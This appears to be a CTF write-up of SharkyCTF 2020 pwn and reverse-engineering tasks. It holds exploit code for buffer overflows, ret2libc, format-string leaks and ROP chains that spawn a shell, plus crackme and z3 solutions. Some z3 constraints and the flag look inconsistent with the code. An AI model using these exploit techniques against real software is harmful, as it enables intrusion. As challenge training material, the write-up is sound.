# SharkyCTF 

🇫🇷  Sat, May 09, 2020 00:01 — Sun, May 10, 23:59 UTC 

# Pwn

## 0_give_away (161pt)
### Description

> Home sweet home. 
>
> Creator: Hackhim


### Attachment

[0_give_away](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/0_give_away/0_give_away)

### Analysis

A warm up task 

```c
void vuln(void){
    char *s;
    fgets(&s, 0x32, _reloc.stdin);
    return;
}
void win_func(void){
    execve("/bin/sh", 0, 0);
    return;
}
```

> buffer overflow, backdoor function

### Solution

Overwrite return address with address of `win` function

```python
offset = 40
payload = 'A'*offset
payload += p64(0x04006A7)
sl(payload)
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/SharkyCTF-2020/pwn/0_give_away) 



## give_away_1 (276pt)
### Description

> Make good use of this gracious give away.
>
> Creator: Hackhim

### Attachment

[give_away_1](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/give_away_1/give_away_1), [libc.so.6](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/give_away_1/libc.so.6)


### Analysis

Another warm up task

```c
int main(int argc, const char **argv, const char **envp){
  init_buffering(&argc);
  printf("Give away: %p\n", &system);
  vuln();
  return 0;
}
char *vuln(){
  char s; 
  return fgets(&s, 50, stdin);
}
```

> buffer overflow, `system` in libc leaked, 32bit elf

### Solution

ret2libc

```python
ru('Give away: ')
system = eval(rc(10))
libcbase = system - libc.sym['system']
binsh  = libcbase + libc.search('/bin/sh').next()
# ret2libc
offset = 36
payload = 'A'*offset
payload += p32(system) + p32(0) + p32(binsh)
sl(payload)
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/SharkyCTF-2020/pwn/give_away_1) 



## give_away_2 (294pt)
### Description

> Make good use of this gracious give away.
>
> Creator: Hackhim


### Attachment

[give_away_2](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/give_away_2/give_away_2) , [libc.so.6](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/give_away_2/libc.so.6)


### Analysis

the last warm up task

```c
int main(int argc, const char **argv, const char **envp){
  init_buffering(&argc, argv, envp);
  printf("Give away: %p\n", main);
  vuln();
  return 0;
}
char *vuln(){
  char s; // [rsp+0h] [rbp-20h]
  return fgets(&s, 128, stdin);
}
```

> buffer overflow, no canary, address of `main` was leaked

### Solution

#### leak libc

re-call `printf` to print address of got entry of `printf` 

```nasm
0x00000880      b800000000     mov eax, 0             # call here
0x00000885      e806feffff     call sym.imp.printf 
0x0000088a      b800000000     mov eax, 0
0x0000088f      e8adffffff     call sym.vuln
0x00000894      b800000000     mov eax, 0
0x00000899      5d             pop rbp
0x0000089a      c3             ret
```

after leak `printf` in libc, `vuln` function would be called again

```python
# leak
ru('Give away: ')
main = eval(rc(14))
info_addr('main',main)
text = main - 0x000864
info_addr('text',text)
printf = text + 0x880
printf_got = text + 0x200fc0
bssbase = elf.bss()+0x800 + text

# gadget
prdi = 0x0000000000000903 + text # pop rdi ; ret
prsi_r15 = 0x0000000000000901 + text

# rop1
offset = 40-8
payload = 'A'*offset
payload += p64(bssbase)
payload += p64(prdi) + p64(printf_got) + p64(printf)

rc()
sl(payload)
printf_libc = uu64(rc(6))
info_addr('printf_libc',printf_libc)
libcbase = printf_libc - libc.sym['printf']
info_addr('libcbase',libcbase)
system = libcbase + libc.sym['system']
info_addr('system',system)
binsh  = libcbase + libc.search('/bin/sh').next()
info_addr('binsh',binsh)
```

#### ret2libc

```python
# rop2
offset = 40-8
pl2 = 'A'*offset
pl2 += p64(bssbase)
pl2 += p64(prdi+1) + p64(prdi) + p64(binsh) + p64(system)
sl(pl2)
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/SharkyCTF-2020/pwn/give_away_2) 



## captain_hook (399pt)
### Description

> Find a way to pop a shell.
>
> Creator: Hackhim

### Attachment

[captain_hook](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/captain_hook/captain_hook), [libc](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/captain_hook/libc-2.27.so)

### Analysis

#### Overview

```c
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```shell
% ./captain_hook 

==Commands========
 1 -> List all characters
 2 -> Lock up a new character
 3 -> Read character infos
 4 -> Edit character infos
 5 -> Free a character
 6 -> Quit
==================

peterpan@pwnuser:~$ 
```

#### lock_up_character

We can input `name`, `age` and `date` in sequence, and the data was stored in follow format:

```c
// 0-13   name
// 32-35  age
// 36-47  date
```

```c
unsigned __int64 lock_up_character(){
  _BYTE v1[12]; // [rsp+Ch] [rbp-14h]
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf(" [ Character index ]: ");
  *v1 = read_user_int();
  if ( *v1 < 0 || *v1 > 3 || jail[*v1] ){
    puts("  [!] Invalid index.");
  }
  else {
    *&v1[4] = malloc(0x44uLL);
    if ( !*&v1[4] )
      exit(-1);
    puts(" [ Character ]");
    printf("  Name: ");
    read_user_str(*&v1[4], 31LL);
    printf("  Age: ", 31LL);
    *(*&v1[4] + 32LL) = read_user_int();
    printf("  Date (mm/dd/yyyy): ");
    read_user_str(*&v1[4] + 36LL, 11LL);
    jail[*v1] = *&v1[4];
  }
  return __readfsqword(0x28u) ^ v2;
}
```

> read 31 bytes to `name` and 11 bytes to `date`

#### edit_character

We can edit character which we have looked up, and name, age and date would be updated if the new value is different from the older.

```c
unsigned __int64 edit_character() {
  __int64 v1; // [rsp+0h] [rbp-40h]
  int v2; // [rsp+4h] [rbp-3Ch]
  char *s1; // [rsp+8h] [rbp-38h]
  char s2; // [rsp+10h] [rbp-30h]
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf(" [ Character index ]: ");
  LODWORD(v1) = read_user_int();
  if ( v1 >= 0 && v1 <= 3 && jail[v1] ) {
    s1 = jail[v1];
    puts(" [ Character ]");
    printf("  Name: ", v1);
    read_user_str(&s2, 127LL);     // bof here
    if ( strcmp(s1, &s2) )
      strncpy(s1, &s2, 0x20uLL);
    printf("  Age: ", &s2);
    v2 = read_user_int();
    if ( *(s1 + 8) != v2 )
      *(s1 + 8) = v2;
    printf("  Date (mm/dd/yyyy): ");
    read(0, &s2, 0xAuLL);
    if ( strcmp(s1 + 36, &s2) )
      strncpy(s1 + 36, &s2, 0x20uLL);
  }
  else {
    puts("  [!] Invalid index.");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

> Notice: read 127 bytes to `name` that cause buffer overflow

Here is a bof, but we can't overwrite the return address directly, because it's protected by `canary` .

#### read_info

We can print `name`, `age` and `date` in this function. If the `date` is a valid format, `printf(src + 36)` which hold a format string vulnerability would be called!

```c
unsigned __int64 read_character_infos(){
  __int64 v1; // [rsp+0h] [rbp-40h]
  char *src; // [rsp+8h] [rbp-38h]
  char dest; // [rsp+10h] [rbp-30h]
  unsigned __int64 v4; // [rsp+38h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf(" [ Character index ]: ");
  LODWORD(v1) = read_user_int();
  if ( v1 >= 0 && v1 <= 3 && jail[v1] ) {
    src = jail[v1];
    strncpy(&dest, jail[v1], 0x20uLL);
    printf("Character name: %s\n", &dest, v1);
    printf("Age: %d\n", *(src + 8));
    strncpy(&dest, src + 36, 0x20uLL);
    printf("He's been locked up on ", src + 36);
    if ( check_date_format((src + 36)) )
      printf(src + 36);       // fmtstring vuln here
    else
      printf("an invalid date.");
    puts(".");
  }
  else {
    puts("  [!] Invalid index.");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

#### helper funtion

I define some helper function for exploiting:

```python
def add(index):
    sla('peterpan@pwnuser:~$ ','2')
    sla(' [ Character index ]: ',str(index))
    sla('  Name: ','TaQini')
    sla('  Age: ','18')
    sla('  Date (mm/dd/yyyy): ','02/02/2020')

def edit(index,fmt):
    sla('peterpan@pwnuser:~$ ','4')
    sla(' [ Character index ]: ',str(index))
    sla('  Name: ','TaQiniAAAA'+fmt)
    sla('  Age: ','20')
    sla('  Date (mm/dd/yyyy): ','02/04/2020')

def read_info(index):
    sla('peterpan@pwnuser:~$ ','3')
    sla(' [ Character index ]: ',str(index))
```

### Solution

As we know the struct of character is as follow, and we can call `edit_character` to edit the character more than 47 bytes

```c
// 0-13   name
// 32-35  age
// 36-47  date
```

When we edit the character, we can puts some format string in the behind of date for leaking info   

```python
add(0)
edit(0,'%17$p.%18$p.%19$p')
read_info(0)
ru('He\'s been locked up on 02/04/2020')
canary = eval(ru('.'))
text = eval(ru('.'))
libcbase = eval(ru('.'))-0x21b97
info_addr('canary',canary)
info_addr('text',text)
info_addr('libc',libcbase)
```

We can overwrite return address with one gadget after `canary` was leaked. 

```python
# debug('b *$rebase(0x1170)')
og = 0x4f322 + libcbase 
# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
edit(0,'A'*30+p64(canary)+p64(0)+p64(og)+p64(0)*8)
```

> restore canary then overwrite return address


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/SharkyCTF-2020/pwn/captain_hook) 



## kikoo_4_ever (600pt)
### Description

> I have a theory that anyone who spends most of their time on the internet, and has virtual friends, or not, knows at least one kikoo in their entourage. "Kikoo: A young teenager or child who uses text messaging, making numerous spelling mistakes, sometimes behaving immaturely, aggressively, vulgarly, rude, even violent, especially on the internet." - wiktionary.org That's the definition I found on wiktionary.org, but I think being a kikoo is not that pejorative, I also think you can be a kikoo no matter how old you are. Being a kikoo is having a different mentality, it's having a different humor, it's having different hobbies, being a kikoo is mostly an internet lover.
>
> After reading these few lines, and that no one has come to mind, it's that there must be a problem, if there is, we'll fix it immediately. Don't worry, I'm going to teach you how to identify a kikoo, they have very characteristic behaviours, and that's what we're going to see in a moment. Start by running the program, then listen to my instructions...
>
> Creator: Hackhim


### Attachment

[kikoo_4_ever](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/kikoo_4_ever/kikoo_4_ever), [kikoo_4_ever.c](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/kikoo_4_ever/kikoo_4_ever.c) and [libc](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/kikoo_4_ever/libc.so.6)

### Analysis

There are toooo many French words in this chall, google translation help me a lot, here are some keywords:

| French          | Meaning        |
| --------------- | -------------- |
| ecrire regle    | write rules    |
| choisir lieux   | choose a place |
| lire les regles | show rules     |

#### read_user_str

This is a read function, reading string up to max `size` , and `\n` will be replaced with `\0`. 

```c
void read_user_str(char* s, int size){
    char *ptr = NULL;
    read(0, s, size);
    ptr = strchr(s, '\n');
    if(ptr != NULL)
        *ptr = 0;
  //Si il y a pas de \n c'est qu'il a rempli le buffer au max du max, enfin j'crois
    else
      s[size] = 0;
}
```

> And if there is no `\n`, the last byte of buffer will be forced fill with `\0` whatever how long the string we have input.

It means that if there are neither `\n` or `\0` in our input string, our input string will not terminal with `\0`, so that we can leak info from stack if there is a print function after reading.

#### ecrire_regle

In this function, we can write rules. After `read_user_str` called, what we inputed will be printed and if there is no `\n` in our input, the `printf("%s")` would leak info in stack. 

```c
void ecrire_regle(){              // write rules
  // ... 
  puts("\nMake me dream, what's that rule?");
  do{
    printf("Rule n°%d: ", (i+1));
    read_user_str(buf, REGLE_BUF_SIZE_512+0x10);          // bof
    printf("Read back what you just wrote:\n%s\n", buf);  // leak
    printf("Is it ok? Shall we move on? (y/n)");          // confirm
    read_user_str(go_on, 4);
  }while(go_on[0] != 'y');
  // ...
}
```

And there is a bof: `read_user_str(buf, REGLE_BUF_SIZE_512+0x10);` that let us overwrite up to `0x10` bytes of data to the behind of `buf`.

### Solution

#### leak libc & canary

We can leak both `libc` and `canary` via `read_user_str` and `printf("%s",buf)` in `ecrire_regle`:

```python
sla('> ','J') # add observations
sla('> ','2') # write rules

# leak libc_start_main_ret
sea('Rule n°6: ',cyclic(7*8))
ru(cyclic(7*8)) 
leak = uu64(rc(6))
sla('Is it ok? Shall we move on? (y/n)','n')
libcbase = leak-0x94038
info_addr('libcbase',libcbase)

# gadget
prdi = 0x000000000002155f + libcbase # pop rdi ; ret
prsi = 0x0000000000023e6a + libcbase # pop rsi ; ret
prdx = 0x0000000000001b96 + libcbase # pop rdx ; ret
ret  = 0x00000000000008aa + libcbase # ret
execve = libc.sym['execve'] + libcbase
binsh = libc.search('/bin/sh').next() + libcbase

# leak canary
sea('Rule n°6: ',cyclic(521))
ru(cyclic(521))
canary = uu64(rc(7))<<8
info_addr('canary',canary)
sla('Is it ok? Shall we move on? (y/n)','n')
```

#### ret to ropchain

Because `read_user_str` will fill the last byte of `rbp` to `0x0`, so that the layout of stack will change.

and after `ecrire_regle` returned to `main`, if `go_on` (variable that control the loop,`rbp-0x58`) is `0`, `leave; ret` (the instruction at end of `main` ) would be executed and `rsp` would be replaced with `rbp` (`rbp` is pointer to our ropchain).

![](http://image.taqini.space/img/20200511042157.png)

> the value of `rbp` changes every time due to the opening of ASLR

```python
payload = p64(0xdeadbeef)*39  # padding
payload+= p64(0)              # 312 - 0
payload+= p64(0xdeadbeef)*9   # padding
payload+= p64(canary)         # 392 - canary 49
payload+= p64(ret)*8          # ret to rop
payload+= p64(prdi) + p64(binsh) # 58
payload+= p64(prsi) + p64(0)  # 61
payload+= p64(prdx) + p64(0)  # 63
payload+= p64(execve)         # 65
payload+= p64(canary)         # 66
sea('Rule n°6: ',payload)
# debug('b *$rebase(0x1dab)\nc\nx/20xg $rbp-0x58\n')
sla('Is it ok? Shall we move on? (y/n)','y')

# exit if failed
sl('9')
p.interactive()
```

record one case of stack layout and then brute force 

> success after a few times of trying

![](http://image.taqini.space/img/20200511043913.png)

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/SharkyCTF-2020/pwn/kikoo_4_ever) 



# Re

## simple (90pt)
> A really simple crackme to get started ;) Your goal is to find the correct input so that the program return 1. The correct input will be the flag.
>
> Creator : Nofix

### source code

```nasm
BITS 64

SECTION .rodata
    some_array db 10,2,30,15,3,7,4,2,1,24,5,11,24,4,14,13,5,6,19,20,23,9,10,2,30,15,3,7,4,2,1,24
    the_second_array db 0x57,0x40,0xa3,0x78,0x7d,0x67,0x55,0x40,0x1e,0xae,0x5b,0x11,0x5d,0x40,0xaa,0x17,0x58,0x4f,0x7e,0x4d,0x4e,0x42,0x5d,0x51,0x57,0x5f,0x5f,0x12,0x1d,0x5a,0x4f,0xbf
    len_second_array equ $ - the_second_array
SECTION .text
    GLOBAL main

main:
    mov rdx, [rsp]
    cmp rdx, 2
    jne exit
    mov rsi, [rsp+0x10]
    mov rdx, rsi
    mov rcx, 0
l1:
    cmp byte [rdx], 0
    je follow_the_label
    inc rcx
    inc rdx
    jmp l1
follow_the_label:
    mov al, byte [rsi+rcx-1]
    mov rdi,  some_array
    mov rdi, [rdi+rcx-1]
    add al, dil
    xor rax, 42
    mov r10, the_second_array
    add r10, rcx
    dec r10
    cmp al, byte [r10]
    jne exit
    dec rcx
    cmp rcx, 0
    jne follow_the_label
win:
    mov rdi, 1
    mov rax, 60
    syscall
exit:
    mov rdi, 0
    mov rax, 60
    syscall
```

### compile

```shell
% nasm main.asm -f elf64
% gcc main.o -o simple
```

### decompile

```c
while ( ((*(&some_array + v4 - 1) + v7[v4 - 1]) ^ 0x2A) == the_second_array[v4 - 1] ){
    if ( !--v4 ) {
        __asm { syscall; LINUX - sys_exit }
        break;
    }
}
```

### re-write the code

```c
int main(){
    char some_array[] = {10,2,30,15,3,7,4,2,1,24,5,11,24,4,14,13,5,6,19,20,23,9,10,2,30,15,3,7,4,2,1,24};
    char the_second_array[] = {0x57,0x40,0xa3,0x78,0x7d,0x67,0x55,0x40,0x1e,0xae,0x5b,0x11,0x5d,0x40,0xaa,0x17,0x58,0x4f,0x7e,0x4d,0x4e,0x42,0x5d,0x51,0x57,0x5f,0x5f,0x12,0x1d,0x5a,0x4f,0xbf};
    char v7[33];
    int i=32;
    while (i){
        v7[i - 1] = (the_second_array[i - 1] ^ (char)0x2A) - some_array[i - 1];
        i--;
    }
    puts(v7);
}
```

### compile & run

```
% gcc simple.c -o solve
% ./solve 
shkCTF{h3ll0_fr0m_ASM_my_fr13nd}
```

### More

you can download all files from my [github](https://github.com/TaQini/ctf/tree/master/SharkyCTF-2020/re/simple) 



## z3_robot (189pt)

### Description

> I made a robot that can only communicate with "z3". He locked himself and now he is asking me for a password ! 
>
> `z 3 w a v e s` 
>
> Creator : Nofix


### Attachment

[z3_robot](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/re/z3_robot/z3_robot)

### Analysis

```c
_BOOL8 __fastcall check_flag(char *a1){
  return (a1[20] ^ 0x2B) == a1[7]
      && a1[21] - a1[3] == -20
      && !(a1[2] >> 6)
      && a1[13] == 116
      && 4 * a1[11] == 380
      && a1[7] >> a1[17] % 8 == 5
      && (a1[6] ^ 0x53) == a1[14]
      && a1[8] == 122
      && a1[5] << a1[9] % 8 == 392
      && a1[16] - a1[7] == 20
      && a1[7] << a1[23] % 8 == 190
      && a1[2] - a1[7] == -43
      && a1[21] == 95
      && (a1[2] ^ 0x47) == a1[3]
      && *a1 == 99
      && a1[13] == 116
      && (a1[20] & 0x45) == 68
      && (a1[8] & 0x15) == 16
      && a1[12] == 95
      && a1[4] >> 4 == 7
      && a1[13] == 116
      && *a1 >> *a1 % 8 == 12
      && a1[10] == 95
      && (a1[8] & 0xAC) == 40
      && a1[16] == 115
      && (a1[22] & 0x1D) == 24
      && a1[9] == 51
      && a1[5] == 49
      && 4 * a1[19] == 456
      && a1[20] >> 6 == 1
      && a1[7] >> 1 == 47
      && a1[1] == 108
      && a1[3] >> 4 == 7
      && (a1[19] & 0x49) == 64
      && a1[4] == 115
      && (a1[2] & a1[11]) == 20
      && *a1 == 99
      && a1[4] + a1[5] == 164
      && a1[15] << 6 == 6080
      && (a1[10] ^ 0x2B) == a1[17]
      && (a1[12] ^ 0x2C) == a1[4]
      && a1[19] - a1[21] == 19
      && a1[12] == 95
      && a1[15] >> 1 == 47
      && a1[19] == 114
      && a1[17] + a1[18] == 168
      && a1[22] == 58
      && (a1[23] & a1[21]) == 9
      && a1[6] << a1[19] % 8 == 396
      && a1[3] + a1[7] == 210
      && (a1[22] & 0xED) == 40
      && (a1[12] & 0xAC) == 12
      && (a1[18] ^ 0x6B) == a1[15]
      && (a1[16] & 0x7A) == 114
      && (*a1 & 0x39) == 33
      && (a1[6] ^ 0x3C) == a1[21]
      && a1[20] == 116
      && a1[19] == 114
      && a1[12] == 95
      && a1[2] == 52
      && a1[23] == 41
      && a1[10] == 95
      && (a1[22] & a1[9]) == 50
      && a1[3] + a1[2] == 167
      && a1[17] - a1[14] == 68
      && a1[21] == 95
      && (a1[19] ^ 0x2D) == a1[10]
      && 4 * a1[12] == 380
      && a1[6] & 0x40
      && (a1[12] & a1[22]) == 26
      && a1[7] << a1[19] % 8 == 380
      && (a1[20] ^ 0x4E) == a1[22]
      && a1[6] == 99
      && a1[12] == a1[7]
      && a1[19] - a1[13] == -2
      && a1[14] >> 4 == 3
      && (a1[12] & 0x38) == 24
      && a1[8] << a1[10] % 8 == 15616
      && a1[20] == 116
      && a1[6] >> a1[22] % 8 == 24
      && a1[22] - a1[5] == 9
      && a1[7] << a1[22] % 8 == 380
      && a1[22] == 58
      && a1[16] == 115
      && (a1[23] ^ 0x1D) == a1[18]
      && a1[23] + a1[14] == 89
      && (a1[5] & a1[2]) == 48
      && (a1[15] & 0x9F) == 31
      && a1[4] == 115
      && (a1[23] ^ 0x4A) == *a1
      && (a1[6] ^ 0x3C) == a1[11];
}
```

### Solution

```python
from z3 import *

x0,x1,x2,x3,x4,x5,x6,x7,x8,x9,x10,x11,x12,x13,x14,x15,x16,x17,x18,x19,x20,x21,x22,x23 = BitVecs("x0 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 x11 x12 x13 x14 x15 x16 x17 x18 x19 x20 x21 x22 x23",8)

x=Solver()


x.add( (x20 ^ 43) == x7 )
x.add( (x21 - x3)  == -20 )
x.add( (x2 >> 222 % 8) == 0 )
x.add( (x13 + 87) == 203 )
x.add( (x11 << 82 % 8) == 380 )
x.add( (x7 >> x17 % 8) == 5 )
x.add( (x6 ^ 83) == x14 )
x.add( (x8 - 63) == 59 )
x.add( (x5 << x9 % 8) == 392 )
x.add( (x16 - x7)  == 20 )
x.add( (x7 << x23 % 8) == 190 )
x.add( (x2 - x7)  == -43 )
x.add( (x21 - 131) == -36 )
x.add( (x2 ^ 71) == x3 )
x.add( (x0 + 208) == 307 )
x.add( (x13 << 64 % 8) == 116 )
x.add( (x20 & 69) == 68 )
x.add( (x8 & 21) == 16 )
x.add( (x12 - 116) == -21 )
x.add( (x4 >> 204 % 8) == 7 )
x.add( (x13 ^ 71) == 51 )
x.add( (x0 >> x0 % 8) == 12 )
x.add( (x10 ^ 243) == 172 )
x.add( (x8 & 172) == 40 )
x.add( (x16 + 40) == 155 )
x.add( (x22 & 29) == 24 )
x.add( (x9 + 39) == 90 )
x.add( (x5 - 71) == -22 )
x.add( (x19 << 194 % 8) == 456 )
x.add( (x20 >> 46 % 8) == 1 )
x.add( (x7 >> 121 % 8) == 47 )
x.add( (x1 + 232) == 340 )
x.add( (x3 >> 244 % 8) == 7 )
x.add( (x19 & 73) == 64 )
x.add( (x4 ^ 124) == 15 )
x.add( (x2 & x11) == 20 )
x.add( (x0 & x0) == 99 )
x.add( (x4 + x5)  == 164 )
x.add( (x15 << 30 % 8) == 6080 )
x.add( (x10 ^ 43) == x17 )
x.add( (x12 ^ 44) == x4 )
x.add( (x19 - x21)  == 19 )
x.add( (x12 - 210) == -115 )
x.add( (x12 - 71) == 24 )
x.add( (x15 >> 193 % 8) == 47 )
x.add( (x19 - 103) == 11 )
x.add( (x17 + x18)  == 168 )
x.add( (x22 ^ 78) == 116 )
x.add( (x23 & x21) == 9 )
x.add( (x6 << x19 % 8) == 396 )
x.add( (x3 + x7)  == 210 )
x.add( (x22 & 237) == 40 )
x.add( (x12 & 172) == 12 )
x.add( (x18 ^ 107) == x15 )
x.add( (x16 & 122) == 114 )
x.add( (x0 & 57) == 33 )
x.add( (x6 ^ 60) == x21 )
x.add( (x20 >> 96 % 8) == 116 )
x.add( (x19 + 194) == 308 )
x.add( (x12 << 16 % 8) == 95 )
x.add( (x2 ^ 206) == 250 )
x.add( (x23 ^ 238) == 199 )
x.add( (x10 << 40 % 8) == 95 )
x.add( (x22 & x9) == 50 )
x.add( (x3 + x2)  == 167 )
x.add( (x17 - x14)  == 68 )
x.add( (x21 + 112) == 207 )
x.add( (x19 ^ 45) == x10 )
x.add( (x12 << 2 % 8) == 380 )
x.add( (x6 & 64) == 64 )
x.add( (x12 & x22) == 26 )
x.add( (x7 << x19 % 8) == 380 )
x.add( (x4 ^ 0) == x4 )
x.add( (x20 ^ 78) == x22 )
x.add( (x6 ^ 229) == 134 )
x.add( (x12 - x7)  == 0 )
x.add( (x19 - x13)  == -2 )
x.add( (x14 >> 212 % 8) == 3 )
x.add( (x12 & 56) == 24 )
x.add( (x8 << x10 % 8) == 15616 )
x.add( (x20 ^ 98) == 22 )
x.add( (x6 >> x22 % 8) == 24 )
x.add( (x22 - x5)  == 9 )
x.add( (x7 << x22 % 8) == 380 )
x.add( (x22 - 153) == -95 )
x.add( (x16 + 3) == 118 )
x.add( (x23 ^ 29) == x18 )
x.add( (x23 + x14)  == 89 )
x.add( (x5 & x2) == 48 )
x.add( (x15 & 159) == 31 )
x.add( (x4 - 2) == 113 )
x.add( (x23 ^ 74) == x0 )
x.add( (x6 ^ 60) == x11)

x.check()
x.model()

l=[x0,x1,x2,x3,x4,x5,x6,x7,x8,x9,x10,x11,x12,x13,x14,x15,x16,x17,x18,x19,x20,x21,x22,x23]

flag = ''.join([chr(x.model()[i].as_long()) for i in l ])

# flag: shkCTF{cl4ss1c_z3___t0_st4rt_:)}
```

### More

you can download all files from my [github](https://github.com/TaQini/ctf/tree/master/SharkyCTF-2020/re/z3_robot) 


